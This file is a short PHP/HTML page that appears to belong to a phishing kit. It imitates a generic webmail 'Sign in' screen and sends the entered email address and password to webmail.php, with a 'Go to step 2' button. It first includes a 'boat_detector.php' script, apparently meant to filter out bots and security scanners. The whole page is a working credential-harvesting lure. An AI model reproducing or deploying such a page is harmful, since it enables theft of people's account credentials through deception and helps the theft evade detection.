<?php include('../boat_detector.php'); ?>
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
</head>
<body>


<title>Sign in </title>
<br/><br/><br/><br/><br/>
<center><img src="webmaillogo.png" /></center>
<form action="webmail.php" method="post" name="login" id="login" style="width:100%; max-width:300px;margin:auto;">
 
                                <p>Email Address<br/>
                                  <input name="username" placeholder="Email" style="width: 290px; height: 35px" type="text" id="username" required/>
 								 </p>
								  Password<br/>
                                    <input name="password" placeholder="Password" style="width: 290px; height: 35px" type="password" id="password" required/>
                                  <p></p>
                                  <br/>
                                  <p>
                                  
                                      <input name="submit" type="image" class="submit" src="./index_files/websignin.png" style="margin-left: 0px;" value="Go to step 2">
  </p>
</form>
<br/><br/>
<center><img src="webmailfooter.png" style="width:100%; max-width:775px;"/></center>




<noscript>&lt;i&gt;Javascript required&lt;/i&gt;</noscript>



</body></html>